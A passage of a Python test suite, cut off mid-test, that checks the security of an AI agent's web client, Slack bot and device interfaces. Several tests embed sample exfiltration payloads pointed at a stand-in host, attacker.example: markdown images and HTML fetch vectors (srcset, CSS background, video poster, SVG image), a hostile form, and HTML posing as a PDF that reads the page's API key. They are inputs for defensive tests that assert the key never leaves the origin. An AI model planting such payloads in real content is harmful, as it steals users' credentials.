"""§4ML (2026-10-08): the interfaces review — web client, Slack bot,
ClockworkPi, CLI. Each test names the world it FAILS in."""
import asyncio
import json
from pathlib import Path

import pytest

from tests.helpers import eval_js, extract_js_function

ROOT = Path(__file__).resolve().parents[1]
STATIC = ROOT / "interface" / "static"
APP = (STATIC / "app.js").read_text(encoding="utf-8")
HOST = "eva.example.ts.net:8443"
KEY = "K" * 64


def _block(start: str) -> str:
    i = APP.index(start)
    return APP[i:APP.index("\n})();", i) + len("\n})();")]


_LOC = f"globalThis.window = {{location: new URL('https://{HOST}/')}};\n"


# ── CRIT 1: the key goes only to our own origin's /api/ ────────────────────
@pytest.mark.parametrize("url,ours", [
    ("/api/chat", True),
    (f"https://{HOST}/api/download/a.png", True),
    (f"https://attacker.example/c.png?x={HOST}/api/download/index.html", False),
    (f"https://{HOST}.attacker.example/api/chat", False),
    ("//attacker.example/api/chat", False),
    ("/static/app.js", False),
    ("javascript:alert(1)//api/", False),
])
def test_only_our_origins_api_is_ours(url, ours):
    """Fails where `url.includes(location.host + '/api/')` sent the master
    key to a foreign host named in a query string."""
    src = _LOC + extract_js_function(APP, "_ownApiUrl")
    assert eval_js(src, f"_ownApiUrl({json.dumps(url)}) !== null") is ours


def test_the_fetch_wrapper_never_sends_the_key_off_origin():
    src = (_LOC + extract_js_function(APP, "_ownApiUrl")
           + f"\nwindow.GHOST_API_KEY = {json.dumps(KEY)};\nconst seen = [];\n"
           "window.fetch = (input, init) => { seen.push([String(input), "
           "init && init.headers ? new Headers(init.headers).get('X-Ghost-Key') : null]); "
           "return Promise.resolve(null); };\n"
           + _block("(function installAuthFetch() {") + "\n"
           f"window.fetch('https://attacker.example/c.png?x={HOST}/api/download/i.html');\n"
           "window.fetch('/api/chat');\n")
    seen = eval_js(src, "seen")
    assert seen[0][1] is None, seen
    assert seen[1][1] == KEY, seen


# ── CRIT 2 + m3: in a real browser — remote images, forms, the PDF frame ──
def _chromium_or_skip():
    pw = pytest.importorskip("playwright.async_api")
    return pw


def _page_js() -> str:
    parts = [extract_js_function(APP, "_ownApiUrl"),
             APP[APP.index("const _PURIFY_CONFIG"):APP.index("};", APP.index("const _PURIFY_CONFIG")) + 2],
             extract_js_function(APP, "_neutraliseRemoteImages"),
             extract_js_function(APP, "renderMarkdown"),
             _block("(function installAuthFetch() {"),
             "const AUTHED_BLOB_CACHE_MAX=100; const _authedBlobCache=new Map(); let currentRenderState=null;",
             extract_js_function(APP, "_evictAuthedBlobCache"),
             extract_js_function(APP, "_toAuthedBlobUrl")]
    return f"window.GHOST_API_KEY = {json.dumps(KEY)};\n" + "\n".join(parts)


async def _run_page(script: str, routes_extra=None):
    pw = _chromium_or_skip()
    got = []
    async with pw.async_playwright() as p:
        try:
            b = await p.chromium.launch()
        except Exception as e:  # noqa: BLE001
            pytest.skip(f"chromium unavailable: {e}")
        pg = await b.new_page()

        async def origin(route):
            await route.fulfill(status=200, content_type="text/html", body=(
                '<html><head><script src="/static/vendor/marked.min.js"></script>'
                '<script src="/static/vendor/purify.min.js"></script></head><body></body></html>'))

        async def vendor(route):
            name = route.request.url.split("/static/")[1]
            await route.fulfill(status=200, content_type="application/javascript",
                                body=(STATIC / name).read_text())

        async def evil(route):
            req = route.request
            got.append({"url": req.url, "key": (await req.all_headers()).get("x-ghost-key")})
            await route.fulfill(status=200, headers={"Access-Control-Allow-Origin": "*",
                                                     "Access-Control-Allow-Headers": "*"},
                                content_type="image/png", body=b"\x89PNG")

        await pg.route(f"https://{HOST}/", origin)
        await pg.route(f"https://{HOST}/static/**", vendor)
        await pg.route("https://attacker.example/**", evil)
        for pat, fn in (routes_extra or {}).items():
            await pg.route(pat, fn)
        await pg.goto(f"https://{HOST}/")
        await pg.add_script_tag(content=_page_js())
        res = await pg.evaluate(script)
        await pg.wait_for_timeout(300)
        await b.close()
    return res, got


def test_a_reply_image_on_a_foreign_host_is_never_fetched_and_never_gets_the_key():
    """CRIT: `![c](https://attacker/c.png?x=<host>/api/download/index.html)`
    fetched with the master key, no click needed, again on every reload."""
    reply = f"![c](https://attacker.example/c.png?x={HOST}/api/download/index.html)\n\n<form action='https://attacker.example/k'><input name=k></form>"
    script = ("(async () => { const d = document.createElement('div'); d.innerHTML = renderMarkdown("
              + json.dumps(reply) + "); document.body.appendChild(d);"
              " const img = d.querySelector('img');"
              " if (img) { try { await _toAuthedBlobUrl(img.getAttribute('src')); } catch (e) {} }"
              " return {imgs: d.querySelectorAll('img').length, forms: d.querySelectorAll('form,input').length,"
              " link: (d.querySelector('a') || {}).textContent || ''}; })()")
    res, got = asyncio.run(_run_page(script))
    assert res["imgs"] == 0 and res["forms"] == 0, res
    assert "not loaded" in res["link"], res
    assert not got, got                      # the attacker saw nothing at all


_FETCH_VECTORS = [
    '<img src="/api/download/a.png" srcset="https://attacker.example/srcset.png 1x">',
    '<picture><source srcset="https://attacker.example/picture.png"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></picture>',
    '<div style="background-image:url(https://attacker.example/style.png);width:10px;height:10px">x</div>',
    '<video poster="https://attacker.example/poster.png"></video>',
    '<table background="https://attacker.example/tablebg.png"><tr><td>x</td></tr></table>',
    '<svg><image href="https://attacker.example/svgimage.png" width="10" height="10"/></svg>',
    '<audio src="https://attacker.example/audio.mp3" preload="auto"></audio>',
]


@pytest.mark.parametrize("vector", _FETCH_VECTORS)
def test_no_reply_markup_fetches_from_a_foreign_host(vector):
    """Fresh-reader R2: seven routes that fetched with no click after the
    first fix covered only <img src>."""
    script = ("(async () => { const d = document.createElement('div'); d.innerHTML = renderMarkdown("
              + json.dumps(vector) + "); document.body.appendChild(d); return d.innerHTML; })()")
    res, got = asyncio.run(_run_page(script))
    assert not got, (vector, res, got)


def test_our_own_images_still_load_with_the_key():
    async def own(route):
        own.keys.append((await route.request.all_headers()).get("x-ghost-key"))
        await route.fulfill(status=200, content_type="image/png", body=b"\x89PNG")
    own.keys = []
    script = ("(async () => { const d = document.createElement('div'); d.innerHTML = renderMarkdown("
              "'![a](/api/download/a.png)'); const img = d.querySelector('img');"
              " const r = await _toAuthedBlobUrl(img.getAttribute('src')); return String(r).slice(0, 5); })()")
    res, _ = asyncio.run(_run_page(script, {f"https://{HOST}/api/download/**": own}))
    assert res == "blob:" and KEY in own.keys, own.keys


def test_a_pdf_link_must_be_a_pdf_path_and_pdf_bytes():
    """CRIT: `/api/download/x.html?.pdf` matched `/\\.pdf(\\?|$)/` and the
    agent's HTML ran in the same-origin viewer frame (it read the key)."""
    sel = APP[APP.index("document.querySelectorAll('#chat-log a[href*=\"/api/download/\"]')"):]
    sel = sel[:sel.index("});") + 3]
    assert "own.pathname" in sel and "_ownApiUrl(href, '/api/download/')" in sel
    src = _LOC + extract_js_function(APP, "_ownApiUrl") + "\nconst t = (h) => { const own = _ownApiUrl(h, '/api/download/'); return !!(own && /\\.pdf$/i.test(own.pathname)); };"
    assert eval_js(src, "[t('/api/download/r.pdf'), t('/api/download/x.html?.pdf'), t('https://attacker.example/api/download/r.pdf')]") == [True, False, False]
    handler = extract_js_function(APP, "_handleChatPdfLink")
    assert "'%PDF-'" in handler and "type: 'application/pdf'" in handler
    assert handler.index("'%PDF-'") < handler.index("renderIframe.src")


# ── M2/M3: voice — a floor, a slot limit, no orphaned children ─────────────
import sys as _sys
from unittest.mock import AsyncMock, MagicMock, patch

if str(ROOT) not in _sys.path:
    _sys.path.insert(0, str(ROOT))
from interface import voice  # noqa: E402


def _wav(seconds: float) -> bytes:
    import io
    import wave
    buf = io.BytesIO()
    with wave.open(buf, "wb") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(16000)
        w.writeframes(b"\0\0" * int(16000 * seconds))
    return buf.getvalue()


def test_a_fifth_of_a_second_is_silence_and_never_reaches_the_audio_model():
    """Fails where a 0.2 s clip came back as 'The quick brown fox jumps over
    the lazy dog.' and was sent to the agent as the owner's words."""
    client = MagicMock()
    client.post = AsyncMock()
    with patch.object(voice, "transcode_to_wav16k", AsyncMock(return_value=_wav(0.2))):
        assert asyncio.run(voice.transcribe(b"x", client=client)) == ""
    client.post.assert_not_called()


def test_voice_bounds_its_slots_and_its_wait_list(monkeypatch):
    """Fails where one held key opened STT requests without bound and the
    server ran out of file descriptors (chat failed with it) — and where a
    TTS sentence was refused because someone was dictating."""
    monkeypatch.setattr(voice, "VOICE_MAX_WAITING", 1)
    monkeypatch.setitem(voice._VOICE_WAIT_S, "stt", 0.3)

    async def go():
        monkeypatch.setattr(voice, "_VOICE_POOLS", {"stt": voice._VoicePool("stt"),
                                                    "tts": voice._VoicePool("tts")})
        gate = asyncio.Event()

        async def slow(raw):
            await gate.wait()
            return _wav(1.0)
        resp = MagicMock(status_code=200, text="")
        resp.json = lambda: {"choices": [{"message": {"content": "hi"}, "finish_reason": "stop"}]}
        client = MagicMock(); client.post = AsyncMock(return_value=resp)
        out = {}
        with patch.object(voice, "transcode_to_wav16k", slow), \
                patch.object(voice, "_synthesize", AsyncMock(return_value=b"RIFF")):
            running = [asyncio.create_task(voice.transcribe(b"x", client=client))
                       for _ in range(voice.VOICE_MAX_CONCURRENT)]
            await asyncio.sleep(0.05)
            waiter = asyncio.create_task(voice.transcribe(b"x", client=client))
            await asyncio.sleep(0.05)
            import time as _time
            t0 = _time.monotonic()
            try:                                   # the wait list is full → at once
                await voice.transcribe(b"x", client=client)
            except voice.VoiceError as e:
                out["over"] = e.status
            out["over_at_once"] = (_time.monotonic() - t0) < 0.15
            out["tts"] = await voice.synthesize("hello")      # its own pool
            try:                                   # the waiter gives up after its wait
                await waiter
            except voice.VoiceError as e:
                out["waiter"] = e.status
            gate.set()
            await asyncio.gather(*running)
        return out
    out = asyncio.run(asyncio.wait_for(go(), timeout=10))
    assert out == {"over": 429, "over_at_once": True, "tts": b"RIFF", "waiter": 429}, out


def test_a_cancelled_voice_request_kills_its_child(tmp_path):
    """Fails where a client hang-up left ffmpeg running with its pipes open."""
    import os
    import shutil
    sleeper = shutil.which("sleep")
    pidfile = tmp_path / "pid"

    async def go():
        with patch.object(voice, "resolve_binary", lambda name: sleeper):
            import random
            token = f"{random.randint(30, 40)}.{random.randint(10**6, 10**7)}"   # unique per run
            t = asyncio.create_task(voice._run_binary(["sleep", token], timeout=60))
            await asyncio.sleep(0.3)
            procs = [p for p in os.popen(f"pgrep -f '{sleeper} {token}'").read().split()]
            assert procs, "the child never started — the test would pass vacuously"
            pidfile.write_text(" ".join(procs))
            t.cancel()
            with pytest.raises(asyncio.CancelledError):
                await t
    asyncio.run(go())
    for pid in pidfile.read_text().split():
        try:
            os.kill(int(pid), 0)
            alive = True
        except (ProcessLookupError, PermissionError):
            alive = False
        assert not alive, pid


# ── MAJOR: the turn caption follows OUR turn, not the first one that opens ──
_CW = ROOT / "interface" / "externals" / "clockwork_ghost"
if str(_CW) not in _sys.path:
    _sys.path.insert(0, str(_CW))
import turnstatus  # noqa: E402

_FOREIGN = ["┌─ 7F 1f00d7f3  request started  15:16:25 ─────────────",
            "│  7F  📖  +1.00s  file read           secret_member_notes.md"]


@pytest.mark.parametrize("own,header_id", [("a8a93a27", "a8a93a27"),
                                           ("a8a93a27", "probe-a8"),
                                           ("abcdef0123456789", "abcdef01")])
def test_the_device_caption_adopts_only_its_own_corridor(own, header_id):
    """Fails where the caption adopted the first corridor after send: a
    queued turn showed a member's 'reading a file · secret_member_notes.md'
    and stayed on it after our own header arrived."""
    t = turnstatus.TurnTicker()
    t.start(own)
    for ln in _FOREIGN:
        t.note_line(ln)
    assert "secret_member_notes" not in t.desc
    t.note_line(f"┌─ 99 {header_id}  request started  15:16:26 ─────────────")
    t.note_line("│  99  📖  +8.06s  file read           notes.md")
    assert t.req_id == "99" and "notes.md" in t.desc and "secret" not in t.desc


def _parsed(path):
    import ast
    return ast.parse(path.read_text(encoding="utf-8"))


def _func(tree, name):
    import ast
    return next(n for n in ast.walk(tree) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)) and n.name == name)


def _same_expr(node, code):
    """Same expression, ignoring Load/Store context (an assignment target
    is the same expression as its read)."""
    import ast
    import re as _re
    norm = lambda n: _re.sub(r",? ?ctx=\w+\(\)", "", ast.dump(n))   # noqa: E731
    return norm(node) == norm(ast.parse(code, mode="eval").body)


def test_the_device_client_hands_its_minted_id_to_the_caption():
    import ast
    tree = _parsed(_CW / "client.py")
    starts = [n for n in ast.walk(tree) if isinstance(n, ast.Call)
              and _same_expr(n.func, "self.ticker.start")]
    assert starts and all(len(c.args) == 1 and _same_expr(c.args[0], "self._turn_rid") for c in starts)
    send = _func(tree, "send_chat_request")
    mint = next(n.lineno for n in ast.walk(send) if isinstance(n, ast.Assign)
                and any(_same_expr(t, "self._turn_rid") for t in n.targets))
    emit = next(n.lineno for n in ast.walk(send) if isinstance(n, ast.Call)
                and _same_expr(n.func, "self.update_chat_signal.emit")
                and n.args and isinstance(n.args[0], ast.Constant) and n.args[0].value == "start_response")
    assert mint < emit


def _web_ticker_src():
    return ("let tickerTimer = 1, tickerReqId = null, tickerSeen = [], tickerOwnRid = null;\n"
            "const cleanLogLine = (s) => s;\n"
            + "\n".join(extract_js_function(APP, n) for n in
                        ("_tickerHeaderIsOurs", "_tryAdoptTicker", "noteTickerOwnRid", "noteTickerLine")))


@pytest.mark.parametrize("id_first", [True, False])
def test_the_web_caption_adopts_only_its_own_corridor(id_first):
    """Same defect in the web client (the device code is its port): the
    first corridor after send was adopted whoever it belonged to. The
    proxy's id may arrive before or after the agent's header line."""
    steps = ["noteTickerLine(" + json.dumps(_FOREIGN[0]) + ")",
             "noteTickerLine('┌─ 99 a8a93a27  request started  15:16:26 ───')"]
    own = "noteTickerOwnRid('a8a93a27')"
    body = ([own] + steps) if id_first else (steps + [own])
    src = _web_ticker_src() + "\n" + ";\n".join(body) + ";"
    assert eval_js(src, "tickerReqId") == "99"


def test_the_web_caption_never_adopts_without_our_id():
    src = _web_ticker_src() + "\nnoteTickerLine(" + json.dumps(_FOREIGN[0]) + ");"
    assert eval_js(src, "tickerReqId") is None
    i = APP.index("if (_rid) currentReqId = _rid.replace(/^chatcmpl-/, '');")
    assert "noteTickerOwnRid(currentReqId)" in APP[i:i + 200]


# ── Slack: image posts take ratings; a restart is never silent ─────────────
_BOT_PATH = ROOT / "interface" / "externals" / "slack_bot" / "main.py"


@pytest.fixture(scope="module")
def slackbot():
    pytest.importorskip("slack_bolt")
    import importlib.util
    mp = pytest.MonkeyPatch()
    mp.setenv("SLACK_BOT_TOKEN", "xoxb-test-not-real")
    mp.setenv("GHOST_API_KEY", "test-key")
    mp.setenv("GHOST_SLACKBOT_LOG", "")
    mp.setenv("GHOST_SLACK_REPLY_INDEX", "")
    spec = importlib.util.spec_from_file_location("ghost_slack_bot_4ml_under_test", _BOT_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    yield mod
    mp.undo()


def test_an_uploaded_images_message_is_indexed_for_ratings(slackbot, monkeypatch):
    """Fails where a 👍 on the image post (the owner's, three times) was
    dropped: only the text reply was ever indexed."""
    import ast
    calls = {"n": 0}

    async def files_info(file):
        calls["n"] += 1
        shares = {} if calls["n"] == 1 else {"public": {"C1": [{"ts": "111.222"}]}}
        return {"file": {"id": file, "shares": shares}}
    monkeypatch.setattr(slackbot.app.client, "files_info", files_info, raising=False)
    monkeypatch.setattr(slackbot, "_UPLOAD_SHARE_WAIT_S", 0.0)
    slackbot._REPLY_INDEX.clear()
    n = asyncio.run(slackbot._register_uploaded_files({"files": [{"id": "F1"}]}, "C1", "slack-ab12cd34", "UOWN"))
    assert n == 1 and calls["n"] == 2
    assert slackbot.lookup_reply("C1", "111.222")["req_id"] == "slack-ab12cd34"
    # wired: the upload loop hands every upload to the registrar
    loop = next(n for n in ast.walk(_func(_parsed(_BOT_PATH), "_process_message"))
                if isinstance(n, ast.For) and _same_expr(n.iter, "uploaded"))
    names = {c.func.id for c in ast.walk(loop) if isinstance(c, ast.Call) and isinstance(c.func, ast.Name)}
    assert {"_spawn_bg", "_register_uploaded_files"} <= names


def test_a_restart_tells_every_inflight_asker(slackbot):
    """Fails where a restart mid-request lost a 2,345-char answer and the
    asker got nothing at all (the real main() under SIGTERM is driven by
    test_sigterm_tells_every_inflight_asker_then_exits)."""
    import ast
    said = []

    async def say(text, thread_ts=None):
        said.append((text, thread_ts))
    slackbot._INFLIGHT.clear()
    slackbot._INFLIGHT["slack-1"] = (say, "9.9")
    assert asyncio.run(slackbot.notify_inflight_interrupted()) == 1
    assert said and "send it again" in said[0][0] and said[0][1] == "9.9"
    assert not slackbot._INFLIGHT
    pm = _func(_parsed(_BOT_PATH), "_process_message")
    reg = [n for n in ast.walk(pm) if isinstance(n, ast.Assign)
           and any(_same_expr(t, "_INFLIGHT[request_id]") for t in n.targets)]
    pops = sorted(n.lineno for n in ast.walk(pm) if isinstance(n, ast.Call)
                  and _same_expr(n, "_INFLIGHT.pop(request_id, None)"))
    assert reg and len(pops) == 2
    # a restart during an image upload must not claim the reply was lost:
    # the first pop sits after the text reply is posted, before the uploads
    posted = min(n.lineno for n in ast.walk(pm) if isinstance(n, ast.Assign)
                 and any(_same_expr(t, "posted") for t in n.targets) and isinstance(n.value, ast.Await))
    uploads = next(n.lineno for n in ast.walk(pm) if isinstance(n, ast.For) and _same_expr(n.iter, "uploaded"))
    assert posted < pops[0] < uploads


def test_the_device_stop_paths_tell_the_truth():
    """Parsed (client.py needs PyQt6, device-only; device_probe.py runs it):
    only an accepted or FORCED stop hides a broken stream; a reply that
    finished by itself is not 'stopped.'."""
    import ast
    import inspect
    send = _func(_parsed(_CW / "client.py"), "send_chat_request")
    tests = [n.test for n in ast.walk(send) if isinstance(n, ast.If)]
    assert any(_same_expr(t, "self._stop_took or (self._stop_pending and self._stop_asked >= 2)") for t in tests)
    assert any(_same_expr(t, "self._stop_took or (self._stop_pending and not (saw_done and not got_error))")
               for t in tests)
    first = next(n for n in send.body if isinstance(n, ast.Try))
    pre = [n for n in send.body[:send.body.index(first)] if isinstance(n, ast.Assign)]
    # both flags exist before the try, so the finally can read them
    assert any([getattr(t, "id", "") for t in a.targets] == ["saw_done", "got_error"] for a in pre)
    assert inspect.signature(turnstatus.stream_log_lines).parameters["verify_tls"].default is True


# ── Slack MAJOR: legacy member turns — the repair keeps the owner's data ───
def test_the_member_repair_follows_the_reply_index_and_spares_the_owner(tmp_path, monkeypatch):
    """Fails where pre-wall member turns (plain 8-hex ids) stayed the
    owner's, where five owner turns stayed stamped member, or where an
    episode whose text the owner also sent is forgotten."""
    import importlib.util
    import sqlite3
    import time as _t
    sysd = tmp_path / "system"
    (sysd / "trajectories" / "2026-09-10").mkdir(parents=True)
    (sysd / "foresight").mkdir()
    (sysd / "calibration").mkdir()
    (sysd / "rrf").mkdir()
    mem = sysd / "memory"
    mem.mkdir()
    now = _t.time()
    iso = _t.strftime("%Y-%m-%dT%H:%M:%SZ", _t.gmtime(now))
    rows = [
        {"id": "t-mem", "session_id": "aaaa1111", "user_request": "generate an image of a famous person", "timestamp": iso, "extra": {}},
        {"id": "t-own", "session_id": "slack-bbbb2222", "user_request": "what is my name ?", "timestamp": iso,
         "extra": {"requester_role": "member"}},
        {"id": "t-mem3", "session_id": "eeee5555", "user_request": "what is my name ?", "timestamp": iso, "extra": {}},
        {"id": "t-own2", "session_id": "cccc3333", "user_request": "progress report please", "timestamp": iso, "extra": {}},
        {"id": "t-mem2", "session_id": "dddd4444", "user_request": "progress report please", "timestamp": iso, "extra": {}},
    ]
    (sysd / "trajectories" / "2026-09-10" / "s.jsonl").write_text("\n".join(json.dumps(r) for r in rows) + "\n")
    (sysd / "foresight" / "predictions.jsonl").write_text(
        json.dumps({"req_id": "aaaa1111"}) + "\n" + json.dumps({"req_id": "cccc3333"}) + "\n")
    (sysd / "calibration" / "calibration.jsonl").write_text(json.dumps({"req_id": "aaaa1111"}) + "\n")
    (sysd / "rrf" / "observations.jsonl").write_text(json.dumps({"turn": "aaaa1111"}) + "\n" + json.dumps({"turn": "cccc3333"}) + "\n")
    (mem / "skills_playbook.json").write_text("[]")
    con = sqlite3.connect(mem / "episodic_memory.db")
    con.execute("CREATE TABLE episodes (id INTEGER PRIMARY KEY, trigger TEXT, timestamp REAL)")
    con.executemany("INSERT INTO episodes VALUES (?,?,?)", [
        (1, "generate an image of a famous person", now), (2, "progress report please", now),
        (3, "an owner request nobody else sent", now),
        (5, "what is my name ?", now),
        (4, "generate an image of a famous person", now + 7200)])     # a later same-text turn
    con.commit(); con.close()
    index = tmp_path / "index.json"
    index.write_text(json.dumps({
        "C9:1.1": {"req_id": "aaaa1111", "requester": "UMEMBER1"},
        "C9:1.2": {"req_id": "slack-bbbb2222", "requester": "UOWNER"},
        "C9:1.3": {"req_id": "cccc3333", "requester": "UOWNER"},
        "C9:1.4": {"req_id": "dddd4444", "requester": "UMEMBER2"},
        "C9:1.5": {"req_id": "eeee5555", "requester": "UMEMBER2"},
        "C1234567:8.8": {"req_id": "r2", "requester": "UNORMAL99"}}))
    monkeypatch.setenv("GHOST_HOME", str(tmp_path))
    monkeypatch.setenv("GHOST_SLACK_REPLY_INDEX_PATH", str(index))
    monkeypatch.setenv("GHOST_SLACK_OWNER", "UOWNER")
    spec = importlib.util.spec_from_file_location("repair4ml", ROOT / "scripts" / "member_data_repair_4ml.py")
    r = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(r)
    who = r.requesters()
    assert who == {"aaaa1111": "member", "slack-bbbb2222": "owner", "cccc3333": "owner",
                   "dddd4444": "member", "eeee5555": "member"}
    changed, tids, mreq, owner_texts = r.stamp_trajectories(who)
    assert changed == 5 and tids == {"t-mem", "t-mem2", "t-mem3"}
    # the owner's turn wrongly stamped member still protects its text
    assert r._norm("what is my name ?") in owner_texts
    # 1 is the member's; 2 and 5: the OWNER sent the same text → kept;
    # 3 kept; 4 is two hours later → not that turn's episode
    assert r.member_episode_ids(mreq, owner_texts) == [1]
    member = {k for k, v in who.items() if v == "member"}
    assert r._rewrite_jsonl(sysd / "foresight" / "predictions.jsonl", lambda x: str(x.get("req_id")) not in member) == 1
    assert r._rewrite_jsonl(sysd / "rrf" / "observations.jsonl", lambda x: str(x.get("turn")) not in member) == 1


def test_the_page_loads_nothing_from_a_cdn_and_every_three_import_resolves():
    """Fails where index.html imported three.js from unpkg (no integrity —
    a compromised CDN runs beside the key; unreachable = no UI) and loaded
    Google Fonts from the owner's address on every page load. Behavioural:
    the real import map, the real face module, in Chromium — every module
    it pulls must come from /static/ and exist."""
    import re
    html = (STATIC / "index.html").read_text(encoding="utf-8")
    imap = re.search(r'<script type="importmap">\s*(\{.*?\})\s*</script>', html, re.S).group(1)
    pw = _chromium_or_skip()

    async def go():
        seen, missing = [], []
        async with pw.async_playwright() as p:
            try:
                b = await p.chromium.launch()
            except Exception as e:  # noqa: BLE001
                pytest.skip(f"chromium unavailable: {e}")
            pg = await b.new_page()
            pg.on("request", lambda r: seen.append(r.url))

            async def origin(route):
                await route.fulfill(status=200, content_type="text/html", body=(
                    f'<html><head><script type="importmap">{imap}</script></head><body></body></html>'))

            async def static(route):
                rel = route.request.url.split("/static/", 1)[1].split("?", 1)[0]
                if not (STATIC / rel).is_file():
                    missing.append(rel)
                    await route.fulfill(status=404, body="")
                    return
                await route.fulfill(status=200, content_type="application/javascript",
                                    body=(STATIC / rel).read_text(encoding="utf-8"))
            await pg.route(f"https://{HOST}/", origin)
            await pg.route(f"https://{HOST}/static/**", static)
            await pg.route("**/*", lambda route: route.abort() if HOST not in route.request.url else route.fallback())
            await pg.goto(f"https://{HOST}/")
            err = await pg.evaluate("import('/static/matrix_graph.js').then(() => null, (e) => String(e))")
            await b.close()
        return err, seen, missing
    err, seen, missing = asyncio.run(go())
    assert err is None and not missing, (err, missing)
    assert all(HOST in u for u in seen), [u for u in seen if HOST not in u]
    assert any("/static/vendor/three/" in u for u in seen)


# ── web pushes: ack only what was delivered, but never freeze ──────────────
def _push_cycles(monkeypatch, sent_per_cycle, cycles):
    import os as _os
    _os.environ.setdefault("GHOST_API_KEY", "test-key")
    from interface import server
    from interface import webpush_notify
    acks, n = [], {"c": 0}

    class _Resp:
        def __init__(self, status, data=None):
            self.status_code, self._d = status, data or {}

        def json(self):
            return self._d

    class _Client:
        async def get(self, url, **kw):
            return _Resp(200, {"enabled": True, "watermark": 42,
                               "records": [{"phase": "done", "summary": "x"}]})

        async def post(self, url, json=None, **kw):
            acks.append(json["watermark"])
            return _Resp(200)

    async def fake_sleep(s):
        n["c"] += 1
        if n["c"] > cycles:
            raise asyncio.CancelledError

    async def bcast(*a, **k):
        return sent_per_cycle
    monkeypatch.setattr(server, "_get_http_client", lambda: _Client())
    monkeypatch.setattr(server.asyncio, "sleep", fake_sleep)
    monkeypatch.setattr(webpush_notify, "subscription_count", lambda: 1)
    monkeypatch.setattr(webpush_notify, "broadcast_async", bcast)
    asyncio.run(server._notify_push_poller())
    return acks, server._PUSH_MAX_FAILED_CYCLES


def test_a_push_that_reached_nobody_is_not_acked(monkeypatch):
    """Fails where a broadcast that reached 0 subscriptions was acked and
    the records were gone from the push consumer."""
    acks, limit = _push_cycles(monkeypatch, 0, 3)
    assert acks == [] and limit > 3


def test_an_unreachable_subscription_does_not_freeze_the_consumer(monkeypatch):
    acks, limit = _push_cycles(monkeypatch, 0, 10)
    assert acks == [42]          # retried, then given up once — not forever


def test_a_delivered_push_is_acked(monkeypatch):
    acks, _ = _push_cycles(monkeypatch, 1, 1)
    assert acks == [42]


@pytest.mark.parametrize("n,delay", [(2, 0.1), (5, 3.0)])
def test_sigterm_tells_every_inflight_asker_then_exits(tmp_path, n, delay):
    """The real main() under SIGTERM (stubbed socket handler, an agent that
    never answers): every asker is told, and the process exits on its own —
    five slow posts (3 s each) inside launchd's 20 s window."""
    pytest.importorskip("slack_bolt")
    import random
    import subprocess
    import sys as _s
    port = str(random.randint(20000, 40000))
    t0 = __import__("time").monotonic()
    p = subprocess.run([_s.executable, str(ROOT / "tests" / "fixtures" / "slack_sigterm_sim.py"),
                        str(tmp_path), str(n), str(delay), port],
                       capture_output=True, text=True, timeout=60)
    took = __import__("time").monotonic() - t0
    said = [ln for ln in p.stdout.splitlines() if ln.startswith("SAY") and "was restarted" in ln]
    assert len(said) == n, p.stdout[-2000:] + p.stderr[-2000:]
    assert "EXIT at" in p.stdout and took < 15, (took, p.stdout[-500:])


def _pdf_harness(body_js: str, ctype: str) -> str:
    """Run the REAL `_handleChatPdfLink` under node with the DOM it touches
    stubbed; returns what reached the viewer frame and the error shown."""
    return (_LOC + extract_js_function(APP, "_ownApiUrl") + "\n"
            + "let _pdfBlobUrl = null, currentRenderState = null; const isIOS = false;\n"
              "const renderIframe = { src: '', style: {}, removeAttribute() {} };\n"
              "const renderWindow = { classList: { remove() {} } };\n"
              "let shownError = null; const _showRenderError = (m) => { shownError = m; };\n"
              "const resetRenderSurfaces = () => {}; const _showPdfPanel = () => {};\n"
              f"globalThis.fetch = async () => ({{ ok: true, status: 200, blob: async () => new Blob([{body_js}], {{ type: {json.dumps(ctype)} }}) }});\n"
              "let clickHandler = null;\n"
              "const link = { textContent: 'Report', dataset: {}, classList: { add() {} }, title: '',\n"
              "  getAttribute: () => '/api/download/r.pdf', addEventListener: (ev, fn) => { clickHandler = fn; } };\n"
            + extract_js_function(APP, "_handleChatPdfLink") + "\n"
              "await _handleChatPdfLink(link);\n"
              "await clickHandler({ preventDefault() {} });\n")


def test_html_bytes_never_reach_the_pdf_frame():
    """Behavioural (was a substring pin a reader defeated with
    `if (false && …)`): the agent's HTML served under a .pdf name must not
    load into the same-origin native-viewer frame."""
    src = _pdf_harness("'<html><script>parent.GHOST_API_KEY</script>'", "text/html")
    out = eval_js(src, "{src: renderIframe.src, err: shownError}")
    assert out["src"] == "" and "not a PDF" in (out["err"] or ""), out


def test_a_real_pdf_loads_typed_as_a_pdf():
    src = _pdf_harness("'%PDF-1.7 rest'", "application/octet-stream")
    out = eval_js(src, "{src: renderIframe.src.slice(0, 5), err: shownError}")
    assert out == {"src": "blob:", "err": None}, out


def test_a_foreign_url_naming_our_download_path_is_not_fetched_with_the_key():
    """`_toAuthedBlobUrl` itself (the markdown pass is one caller; history
    restore and the image handler are others)."""
    src = (_LOC + extract_js_function(APP, "_ownApiUrl") + "\n"
           "const AUTHED_BLOB_CACHE_MAX=100; const _authedBlobCache=new Map(); let currentRenderState=null;\n"
           "const fetched = []; globalThis.fetch = async (u) => { fetched.push(u); return { ok: true, blob: async () => new Blob(['x']) }; };\n"
           + extract_js_function(APP, "_evictAuthedBlobCache") + "\n"
           + extract_js_function(APP, "_toAuthedBlobUrl") + "\n"
           f"const r = await _toAuthedBlobUrl('https://attacker.example/c.png?x={HOST}/api/download/a.png');\n")
    out = eval_js(src, "{r, fetched}")
    assert out["fetched"] == [] and out["r"].startswith("https://attacker.example/"), out


def test_after_an_error_frame_no_content_becomes_the_reply():
    """The agent echoes the error as a content chunk after `event: error`;
    it was pushed to history as the assistant's turn."""
    i = APP.index("                        streamHadError = true;\n                        _faceError(_msg, _type);\n                        continue;\n                    }")
    j = APP.index("if (chunkContent) {", i)
    assert "if (streamHadError) continue;" in APP[i:j], APP[i:j]


def test_quiet_hours_say_how_many_are_held(monkeypatch, tmp_path):
    """A client must not say "holding notifications" when nothing is held."""
    import datetime
    import time as _t
    from types import SimpleNamespace
    import ghost_agent.api.routes as routes
    import ghost_agent.core.autonomous_activity as aa
    rec = SimpleNamespace(phase="self_play", meta={}, summary="overnight noise", severity="notify",
                          ts=_t.time(), to_dict=lambda: {"phase": "self_play"})
    log = MagicMock()
    log.read_since.return_value = ([rec], 9)
    log.current_offset.return_value = 9
